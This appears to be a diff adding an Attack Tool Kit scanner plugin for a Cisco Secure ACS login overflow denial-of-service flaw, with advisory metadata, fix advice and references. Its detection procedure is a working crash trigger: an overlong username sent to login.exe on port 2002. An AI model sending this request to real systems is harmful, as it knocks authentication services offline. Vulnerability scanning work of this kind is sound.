@@ -1,0 +1,47 @@
+<plugin_id>26</plugin_id>
+<plugin_name>Cisco Secure ACS Management Interface Login Overflow</plugin_name>
+<plugin_family>Network devices</plugin_family>
+<plugin_created_date>2003/11/14</plugin_created_date>
+<plugin_created_name>Marc Ruef</plugin_created_name>
+<plugin_created_email>marc dot ruef at computec dot ch</plugin_created_email>
+<plugin_created_web>http://www.computec.ch</plugin_created_web>
+<plugin_created_company>computec.ch</plugin_created_company>
+<plugin_updated_name>Marc Ruef</plugin_updated_name>
+<plugin_updated_email>marc dot ruef at computec dot ch</plugin_updated_email>
+<plugin_updated_web>http://www.computec.ch</plugin_updated_web>
+<plugin_updated_company>computec.ch</plugin_updated_company>
+<plugin_updated_date>2004/11/13</plugin_updated_date>
+<plugin_version>1.4</plugin_version>
+<plugin_changelog>Corrected the plugin structure and added the accuracy values in 1.4</plugin_changelog>
+<plugin_protocol>tcp</plugin_protocol>
+<plugin_port>2002</plugin_port>
+<plugin_procedure_detection>open|sleep|send GET /login.exe?user=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&reply=any&id=1 HTTP/1.0\n\n|sleep|close|open|sleep 5|close|pattern_exists Cisco</plugin_procedure_detection>
+<plugin_detection_accuracy>90</plugin_detection_accuracy>
+<plugin_comment>This plugin was written with the ATK Attack Editor.</plugin_comment>
+<bug_advisory>http://www.securityfocus.com/archive/1/319576</bug_advisory>
+<bug_produced_name>Cisco Systems</bug_produced_name>
+<bug_produced_email>info at cisco dot com</bug_produced_email>
+<bug_produced_web>http://www.cisco.com</bug_produced_web>
+<bug_affected>Cisco Secure ACS 2.1 to 3.11</bug_affected>
+<bug_not_affected>Cisco Secure ACS newer than 3.11</bug_not_affected>
+<bug_vulnerability_class>Denial Of Service</bug_vulnerability_class>
+<bug_description>The Cisco Secure ACS Management Interface authenticates a user over a script named login.exe. In this the user sends the user name. If this parameter is more than 400 bytes long, the server causes to crash. You have to restart to work again.</bug_description>
+<bug_solution>Upgrade your Cisco firmware and filter incoming traffic on port tcp/80. As workaround (disabling the web service) you could add the rule set web disabled, write, reboot into your device.</bug_solution>
+<bug_fixing_time>20 minutes</bug_fixing_time>
+<bug_exploit_availability>Yes</bug_exploit_availability>
+<bug_exploit_url>http://www.securityfocus.com/bid/7413/exploit/</bug_exploit_url>
+<bug_remote>Yes</bug_remote>
+<bug_local>No</bug_local>
+<bug_severity>High</bug_severity>
+<bug_popularity>8</bug_popularity>
+<bug_simplicity>8</bug_simplicity>
+<bug_impact>8</bug_impact>
+<bug_risk>8</bug_risk>
+<bug_nessus_risk>High</bug_nessus_risk>
+<bug_check_tool>Nessus is able to do the same check.</bug_check_tool>
+<source_cve>CAN-2003-0210</source_cve>
+<source_securityfocus_bid>7413</source_securityfocus_bid>
+<source_nessus_id>11556</source_nessus_id>
+<source_literature>Hacking Exposed: Network Security Secrets & Solutions, Stuart McClure, Joel Scambray and George Kurtz, February 25, 2003, 4th Edition, McGraw-Hill Osborne Media, ISBN 0072227427</source_literature>
+<source_misc>http://www.securityfocus.com/archive/1/319483</source_misc>
+
